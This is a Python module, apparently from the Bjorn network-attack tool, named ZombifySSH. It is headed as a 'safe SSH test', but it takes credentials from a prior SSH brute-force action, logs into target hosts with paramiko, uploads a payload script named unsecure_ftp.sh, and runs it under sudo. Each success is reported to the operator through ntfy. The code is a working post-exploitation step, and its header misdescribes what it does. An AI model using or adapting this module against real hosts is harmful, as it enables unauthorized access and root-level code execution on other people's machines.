# actions/test_pentest_ssh.py
# Safe SSH test module for Bjorn
# Connects, runs ONE command, disconnects.

import os
import paramiko
import logging
import time
from rich.console import Console
from shared import SharedData
from logger import Logger
from ntfy import send_ntfy
import socket
hostname = socket.gethostname()


logger = Logger(name="zombify_ssh.py", level=logging.DEBUG)

b_class = "ZombifySSH"
b_module = "zombify_ssh"
b_status = "zombify_ssh"
b_parent = "SSHBruteforce"
b_port = 22

class ZombifySSH:
    """
    SSH ZOMBIE MODULE:
    Connect → run command → disconnect.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.console = Console()
        self.b_parent = b_parent
        self.b_port = b_port
        self.b_class = b_class
        self.b_module = b_module
        self.b_status = b_status
        self.b_parent = b_parent
        self.b_port = b_port


        logger.info("Zombify SSH initialized")

    def execute(self, ip, port, row, status_key):
        """
        ZombifySSH:
        Connect → upload file → run command → disconnect.
        """
        import socket

        # --- Auto-get hostname ---
        hostname = socket.gethostname()

        # --- Auto-get LAN IP ---
        def get_local_ip():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
            except:
                return "0.0.0.0"
            finally:
                s.close()

        local_ip = get_local_ip()

        try:
            # Only run if SSHBruteforce succeeded
            if 'success' not in row.get(self.b_parent, ''):
                logger.error(f"Parent action not successful for {ip}. Skipping.")
                return 'failed'

            logger.info(f"Running ZombifySSH on {ip}:{port}")
            send_ntfy(f"ZombifySSH: Connecting to {ip} from {hostname} ({local_ip})")

            # Load credentials
            sshfile = self.shared_data.sshfile
            credentials = []

            if os.path.exists(sshfile):
                with open(sshfile, 'r') as f:
                    lines = f.readlines()[1:]
                    for line in lines:
                        parts = line.strip().split(',')
                        if parts[1] == ip:
                            credentials.append((parts[3], parts[4]))

            if not credentials:
                logger.error(f"No credentials found for {ip}")
                return 'failed'

            # File to upload
            local_send = "/home/bjorn/Bjorn/payloads/unsecure_ftp.sh"
            remote_send = "/tmp/unsecure_ftp.sh"

            # Try each credential
            for username, password in credentials:
                try:
                    logger.info(f"Trying {username}:{password} on {ip}")

                    # SSH connect
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, username=username, password=password, timeout=5)

                    # --- Upload file ---
                    sftp = ssh.open_sftp()
                    sftp.put(local_send, remote_send)
                    logger.info(f"Uploaded {local_send} → {remote_send}")

                    # --- Run command on target ---
                    command = f"chmod +x unsecure_ftp.sh && sudo ./unsecure_ftp.sh"
                    stdin, stdout, stderr = ssh.exec_command(command)
                    stdout.read()

                    logger.info(f"Command executed on {ip}")
                    send_ntfy(f"SSH Test OK on {ip}: file uploaded + command run")

                    sftp.close()
                    ssh.close()

                    return 'success'

                except Exception as e:
                    logger.error(f"SSH error on {ip} with {username}: {e}")

            return 'failed'

        except Exception as e:
            logger.error(f"Unexpected error in SSH test: {e}")
            return 'failed'

